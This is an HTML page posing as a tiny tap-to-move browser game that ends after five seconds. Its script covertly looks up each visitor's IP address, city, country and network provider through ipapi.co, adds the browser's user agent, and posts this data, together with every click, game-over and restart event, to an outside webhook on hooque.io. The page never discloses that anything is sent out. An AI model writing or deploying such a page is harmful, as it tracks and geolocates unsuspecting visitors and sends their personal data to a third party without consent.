<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{
 margin:0;
 background:black;
 color:white;
 text-align:center;
 font-family:sans-serif;
 overflow:hidden;
}

#player{
 width:50px;
 height:50px;
 background:cyan;
 position:absolute;
 bottom:20px;
 left:50%;
 transform:translateX(-50%);
}

#gameover{
 display:none;
 position:fixed;
 top:0;
 left:0;
 width:100%;
 height:100%;
 background:rgba(0,0,0,0.9);
 justify-content:center;
 align-items:center;
 flex-direction:column;
}

button{
 padding:10px 20px;
 font-size:18px;
}

#info{
 margin-top:20px;
 font-size:14px;
}
</style>
</head>

<body>

<h2>Tap screen to move</h2>

<div id="player"></div>

<div id="gameover">
  <h1>Game Over</h1>
  <button onclick="restartGame()">Try Again</button>
</div>

<div id="info">Loading info...</div>

<script>

let player = document.getElementById("player");
let userData = {};

// 🌐 IP + Location fetch
fetch('https://ipapi.co/json/')
.then(res => res.json())
.then(data => {

  let device = navigator.userAgent;

  userData = {
    ip: data.ip,
    city: data.city,
    country: data.country_name,
    network: data.org,
    device: device,
    time: new Date()
  };

  document.getElementById("info").innerHTML = `
    <p>IP: ${data.ip}</p>
    <p>City: ${data.city}</p>
    <p>Country: ${data.country_name}</p>
  `;

  sendData("page_open");

});

// 📡 function to send data
function sendData(type){
  fetch('https://app.hooque.io/hooks/019d1ccc-a9be-7433-9eed-1d2f97510004', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      ...userData,
      action: type,
      time: new Date()
    })
  });
}

// 🎮 click event
document.addEventListener("click", ()=>{
 let x = Math.random() * (window.innerWidth - 50);
 player.style.left = x + "px";

 sendData("click");
});

// ⏱️ 5 sec बाद game over
setTimeout(()=>{
 document.getElementById("gameover").style.display="flex";
 sendData("game_over");
},5000);

// 🔁 restart
function restartGame(){
 sendData("restart");
 location.reload();
}

</script>

</body>
</html>
